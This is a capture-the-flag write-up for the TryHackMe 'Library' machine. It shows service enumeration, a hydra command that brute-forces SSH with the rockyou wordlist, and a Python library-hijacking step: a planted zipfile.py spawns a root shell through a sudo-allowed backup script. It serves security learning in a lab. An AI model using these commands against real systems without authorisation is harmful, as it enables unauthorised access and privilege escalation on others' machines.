---
title: "TryHackMe - Library"
author: Nasrallah
description: ""
date: 2022-11-27 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, hijacking, python, hydra, bruteforce]
img_path: /assets/img/tryhackme/library
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Library](https://tryhackme.com/room/bsidesgtlibrary) from [TryHackMe](https://tryhackme.com). The machine is running ssh and a web server, we find a username in the web page then brute force the password of ssh and get foothold. After that we use library hijacking to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.200.89
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running OpenSSH and 80 running Apache http web server.

### Web

Let's navigate to the web page.

![](1.png)

Here we have a blog with one post. Looking through this page, we find a possible username.

![](2.png)

Now let's run a directory scan.

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.200.89
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/20 06:14:00 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/images               (Status: 301) [Size: 313] [--> http://10.10.200.89/images/]
/index.html           (Status: 200) [Size: 5439]                                 
/robots.txt           (Status: 200) [Size: 33]                                   
/server-status        (Status: 403) [Size: 300]                                  
===============================================================
```

Let's check robots.txt file.

![](3.png)

It says rockyou.

## **Foothold**

Let's brute force ssh with username we found and rockyou list.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh 
```

![](4.png)

Great! We got the password, let's login.

![](5.png)



## **Privilege Escalation**

Let's check our privilges.

![](6.png)

There is a python script file we can run as root in our home directory.

Let's check the file

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()

```

We the script import two modules, `os` and `zipfile`, and they get called later in the script.

We can use a technique called `Python library hijacking`, how this technique works is when importing a module within a script, python will search that module file throughout a predefined directories in a specific order of priority, but if there exists a python module file in the same directory as the original script.

Now create file named `zipfile.py`, then write the following code in it.

```python
import os; os.system("/bin/bash")
```

Then we run the python script `bak.py` with sudo.

```bash
meliodas@ubuntu:~$ echo 'import os; os.system("/bin/bash")' > zipfile.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~# whoami
root
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# 

```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
